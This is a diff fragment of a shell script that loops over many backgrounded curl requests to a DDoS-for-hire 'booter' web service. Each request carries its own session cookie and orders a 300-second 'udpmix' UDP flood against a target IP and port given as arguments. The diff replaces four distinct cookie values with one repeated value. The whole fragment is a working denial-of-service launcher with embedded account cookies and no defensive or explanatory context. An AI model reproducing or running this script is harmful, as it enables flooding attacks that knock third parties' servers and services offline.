@@ -13,10 +13,10 @@ let BOMB_TIME=$3/5
 
 while [ $BOMB -lt $BOMB_TIME ]
 do
-  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=cefcc8ce-be3e-4a2d-bf75-697d78a8e126' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
-  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=71e7b7d7-8a9e-41cf-b46b-b4f7122e0808' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
-  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=02045c19-1eae-41ca-8a79-2c201b4d61e1' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
-  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=59317e97-fa4f-48ea-81ea-7441a9cf3522' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
+  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=7754a088-d7ca-491a-8475-d47ee8146837' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
+  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=7754a088-d7ca-491a-8475-d47ee8146837' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
+  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=7754a088-d7ca-491a-8475-d47ee8146837' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
+  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=7754a088-d7ca-491a-8475-d47ee8146837' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
   curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=3c1a283b-ef5e-423a-9f4d-f198fd38ada2' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
   curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=331eb1a6-5d73-4506-bb80-e4bdb638afab' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
   curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=fcd51da4-476b-4042-baf4-afb14c387bbc' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
